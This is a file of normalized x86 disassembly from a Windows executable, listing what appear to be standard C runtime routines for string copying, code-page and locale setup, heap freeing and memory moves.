jmp r-xdata
sub_405d5b
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_404f92
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40382c
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_405ec7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405b59
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405b59
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_405ad0
mov eax esi
sub_405f3c
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_405b59
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_405b59
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_405ad0
mov eax esi
jmp r-xdata
sub_406009
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_406024
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405b59
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405b59
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_405ad0
mov eax esi
sub_406087
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_405b59
mov [ eax ] 0x16
call sub_405ad0
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_4060c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_405142
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_406cd4
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_4063db
mov [ esi + 0x4 ] eax
sub_40614d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4060c6
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_4061b8
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_4061e7
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_403840
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_40624b
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_407451
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_407324
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_407324
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40382c
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_403840
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_4063db
push 0xc
push r--data
call sub_405430
call sub_405142
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_4056f0
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406476
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_405475
retn
push 0x20
call sub_404564
cmp esi rw-data
je r-xdata
push esi
call sub_40689c
pop ecx
sub_40647f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_4060c6
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4064fb
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_40647f
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_4061e7
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_403840
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40382c
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_4061b8
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_40624b
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_403840
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4061b8
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_4066e4
push 0x14
push r--data
call sub_405430
or [ ebp - 0x20 ] 0xffffffff
call sub_405142
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_4063db
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_40647f
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_406935
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_405475
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_4064fb
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_405b59
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40689c
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_40689c
pop ecx
push 0xd
call sub_4056f0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406845
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_40689c
pop ecx
sub_40689c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_405b59
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405b17
pop ecx
mov [ esi ] eax
pop esi
sub_4068d6
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_405b59
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_405b59
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_405ad0
mov eax esi
jmp r-xdata
sub_406935
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_407491
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_40697a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407525
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_4069c6
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4075a7
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_406a14
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_406aa3
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_406b3c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40689c
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40689c
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40689c
push [ esi + 0xc0 ]
call sub_40689c
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_407654
push [ esi + 0xd4 ]
call sub_40689c
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_40689c
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40689c
pop ecx
push [ esi + 0xb0 ]
call sub_40689c
push [ esi + 0xbc ]
call sub_40689c
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40689c
push [ esi + 0xbc ]
call sub_407a34
pop ecx
pop ecx
push eax
call sub_40689c
pop ecx
push eax
call sub_40689c
push [ esi + 0xbc ]
call sub_4079cb
pop ecx
pop ecx
sub_406c87
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_406a14
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_406aa3
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_406b3c
pop ecx
sub_406cd4
push 0xc
push r--data
call sub_405430
call sub_405142
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_4056f0
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_406c87
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406d41
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_405142
mov esi [ eax + 0x6c ]
mov eax esi
call sub_405475
retn
push 0x20
call sub_404564
sub_406d4d
call sub_405778
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_405785
pop ecx
push 0x3
call sub_404530
int3
push 0x1
push 0x40000015
push 0x3
call sub_405955
add esp 0xc
sub_406d80
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_406e04 ]
jmp [ ecx * 4 + jump_table_406e84 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406ef0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_40708c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_406f90 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40708c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
